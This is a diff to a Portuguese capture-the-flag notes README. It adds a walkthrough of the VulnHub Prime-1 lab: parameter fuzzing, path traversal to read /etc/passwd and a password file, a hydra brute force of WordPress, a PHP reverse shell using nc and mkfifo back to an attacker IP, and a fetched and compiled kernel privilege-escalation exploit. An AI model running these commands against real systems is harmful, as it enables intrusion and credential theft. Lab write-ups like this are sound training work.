@@ -18,8 +18,9 @@ Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
 Desafio 16 - https://www.vulnhub.com/entry/symfonos-31,332/</br>
 Desafio 17 - Manual Webmin 1.920 exploit | CVE-2019-15107 | Crontab - https://www.vulnhub.com/entry/nezuko-1,352/ </br>
 Desafio 18 - CWE-521 | Tomcat7 bad .jsp | CWE-732 crontab  	    - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
-Desafio 19 -  - https://www.vulnhub.com/entry/prime-1,358/</br>
-Desafio 20 - - </br>
+Desafio 19 - Parameter Fuzzing | Password Spray | CVE-2017-16995 - https://www.vulnhub.com/entry/prime-1,358/</br>
+Desafio 20 -  -https://www.vulnhub.com/entry/sumo-1,480/ </br>
+Desafio 21 - - </br>
 <br/>**--VM--**
 
 <br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
@@ -824,3 +825,76 @@ Desafio 20 - - </br>
 		*nc -lnvp 444
 		
 		*echo 'mkfifo /tmp/kncu; nc 192.168.100.4 444 0</tmp/kncu | /bin/sh >/tmp/kncu 2>&1; rm /tmp/kncu' >> script.sh
+
+
+
+<h3>Dia 19 			25/9/2020</h3>
+
+	*scan
+	
+	*dirb htt://ip_vm
+		dirb htt://ip_vm -X .php
+		dirb htt://ip_vm -X .txt
+			htt://ip/secret.txt
+			#location.txt
+		
+	*wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc 404 --hl 7 --hw 500 http://ip/index.php?FUZZ=location.txt
+					-c : Output with colors
+						-w: wordlist
+							--hc: ignorar o erro 404 
+								--hl: mostrar a partir do tamanho 7
+									--hw: palavras/segundo ?
+									
+		#	 http://ip/index.php?file=location.txt
+					http://192.168.100.25/index.php?file=location.txt
+		
+		# http://192.168.100.25/image.php?secrettier360=
+		
+		
+	*burp
+		-> repeater
+		http://192.168.100.25/image.php?secrettier360=
+		http://192.168.100.25/image.php?secrettier360=../../../../../../../../../etc/passwd
+			#find password.txt...
+		http://192.168.100.25/image.php?secrettier360=../../../../../../../../../home/saket/password.txt
+			#follow_the_ippsec
+			
+		*	http://192.168.100.25/wordpress/wp-admin
+			#atack brute user
+				password: follow_the_ippsec
+				
+				
+	*hydra -L /usr/share/wordlists/rockyou.txt -p follow_the_ippsec 192.168.100.25 -V http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+	
+		Login no wordpress		
+		#victor
+		#follow_the_ippsec
+				
+				
+		#msfvenom -p cmd/unix/reverse_netcat lport=443 lhost=192.168.100.4 -f raw    -> colar na próxima etapa <?php   xxxxxxx   ?>
+		#nc -lnvp 443
+	
+	*Apparece -> theme editor -> ‘encontrar algum que de pra editar(salvar)’ ->secret.php
+	
+	<?php
+				exec("mkfifo /tmp/cigksp; nc 192.168.100.4 443 0</tmp/cigksp | /bin/sh >/tmp/cigksp 2>&1; rm /tmp/cigksp");
+	?>
+	
+	* ver a página de origem
+		-> procurar o content do tema: http://192.168.100.25/wordpress/wp-content/themes/twentynineteen/print.css?ver=1.4
+		
+		#http://192.168.100.25/wordpress/wp-content/themes/twentynineteen/secret.php
+		
+	*nc
+	uname -a
+		#ubuntu 16.04.2
+		
+	*kali: searchsploit -m 45010
+	gcc 45010.c -o beco19
+	python3 -m http.server
+	
+	*nc
+		wget http://ip_kali:8000/beco19
+		chmod +x beco19
+		./beco19
+
